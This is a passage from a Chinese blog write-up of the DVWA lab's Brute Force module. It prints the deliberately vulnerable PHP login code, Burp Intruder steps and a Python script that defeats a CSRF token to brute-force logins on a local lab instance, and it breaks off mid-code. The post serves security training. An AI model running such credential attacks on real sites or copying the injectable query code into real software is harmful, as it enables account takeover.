<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="fzykn06's blog"><meta name="keywords" content="信安, 前端, 后端"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.4"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.4"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="stylesheet" type="text/css" href="https://unpkg.com/gitalk/dist/gitalk.css?v=2.0.4"><title>DVWA关卡纪录 | fzykn06's blog</title><meta name="generator" content="Hexo 4.2.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">DVWA关卡纪录</h1><a id="logo" href="/.">fzykn06's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">DVWA关卡纪录</h1><div class="post-meta"><a href="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/#comments" class="comment-count"></a><p><span class="date">Jun 29, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><p>本文参考：<a href="https://www.freebuf.com/author/lonehand" target="_blank" rel="noopener">https://www.freebuf.com/author/lonehand</a></p>
<p>DVWA(Damn Vulnerable Web Application)是一个用来进行安全脆弱性鉴定的PHP/Mysql Web应用，为安全人员提供一个训练的靶场。</p>
<p>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA（不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。</p>
<p>DVWA的搭建还是比较简单的</p>
<p>安装包下载：<a href="https://github.com/ethicalhack3r/DVWA/archive/master.zip" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a><br>环境搭建：<a href="https://jingyan.baidu.com/article/a3a3f81117e5f18da2eb8a09.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/a3a3f81117e5f18da2eb8a09.html</a></p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手段之一。</p>
<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>后端接受数据源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中看出，在服务器端只是验证了login参数是否有被设置（isset函数在php中是用来检测变量是否被设置的，该函数的返回类型为布尔类型，即true/false），没有任何的防爆破的机制，且对参数username和password没有任何过滤，存在明显的sql注入漏洞。</p>
<p>漏洞利用</p>
<p>利用burpsuite的Intruder模块进行爆破</p>
<p>1.进行抓包并转发到Intruder，并将password参数设置为爆破点</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/1.png" alt></p>
<p>2.在Intruder模块中的Payloads板块Payload Options进行选择爆破密码，这边暂时选择了Passwords字典，如果没有爆破出密码可以进行更换密码字典，或者添加密码字典。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/2.png" alt></p>
<p>3.这些选择完毕可以点击右上角的Start attack开始进行爆破，当爆破完毕查看数据包长度，最与众不同的那个数据包长度就是密码</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/3.png" alt></p>
<p>4.重新进入界面用爆破出来的密码进行登录</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/4.png" alt></p>
<p>成功登陆</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>服务器源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过服务器源码发现，Medium中主要是增加了mysql_real_escape-string函数，该函数会对字符串中的特殊符号（0x00，n，r，‘，“，x1a）进行转义，基本上能够抵御sql注入，在mysql5.5.37以下版本如果设置编码为GBK,能够构造编码绕过mysql_real_escape_strin对单引号的转义；同时$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性，但是依旧没有加入有效的防爆破机制。</p>
<p>mysql_real_escape_string函数绕过方式可以参看<br><a href="https://fzykn06.github.io/2019/12/27/sqli-labs-writeup/">https://fzykn06.github.io/2019/12/27/sqli-labs-writeup/</a>   less36中的playload方式进行。也可参考：<a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html" target="_blank" rel="noopener">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p>
<p>漏洞利用：</p>
<p>burpsuite爆破，爆破方式和low的一致，这边简要步骤：</p>
<p>拦截报文，设置爆破参数，选择字典</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/5.png" alt></p>
<p>通过爆破发现密码为password，并尝试登录，发现是可以登录的</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/6.png" alt></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>服务器端代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">"avatar"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>High级别的代码加入了token进行检验，可以抵御CSRF攻击，同时增加了爆破的难度，通过抓包可以看到，登录验证时提交了四个参数:username,password,login和user_token</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/7.png" alt></p>
<p>每次服务器返回的登录页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交，服务器收到前端提交的参数都会先进行token的检查，在进行sql查询。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/8.png" alt></p>
<p>同时在High级别的代码中，使用stripslashes（去除字符串中的反斜线字符，如果有两个连续的反斜线，则只会去掉一个）mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/9.png" alt></p>
<p>漏洞利用</p>
<p>因为加入了Anti-CSRFtoken预防无脑爆破，所以就不适合使用burpsuite，需要使用python脚本进行爆破，本来使用freebuf参考链接里面的脚本，发现跑出来不对，后面尝试了Somnus师傅的脚本（ps要用127.0.0.1作为主机地址，不让跑出来还是不对，我也不知道为啥）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//python2<span class="number">.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/DVWA-master/vulnerabilities/brute/"</span></span><br><span class="line">header=&#123;</span><br><span class="line">	    <span class="string">'Host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'http://172.18.9.91/DVWA-master/vulnerabilities/brute/'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=l59afi596kgh0bmesipt01ein6'</span>,</span><br><span class="line">	    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">	   &#125;</span><br><span class="line">file=open(<span class="string">'pass.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    line=line.strip()</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    r=s.get(url,headers=header)</span><br><span class="line">    soup=BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line">    user_token=soup.find_all(<span class="string">'input'</span>)[<span class="number">3</span>][<span class="string">'value'</span>]</span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'password'</span>:line,</span><br><span class="line">        <span class="string">'user_token'</span>:user_token,</span><br><span class="line">        <span class="string">'Login'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line">    html=s.get(url,params=payload,headers=header)</span><br><span class="line">    length=len(html.text)</span><br><span class="line">    print(<span class="string">'user_token:'</span>+user_token+<span class="string">'username:admin password:'</span>+line+<span class="string">' length:'</span>+str(length))</span><br></pre></td></tr></table></figure>

<p>脚本跑下来，发现password长度不一样</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/10.png" alt></p>
<p>使用admin和password进行登录，成功登陆</p>
<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">'password'</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">'last_login'</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) 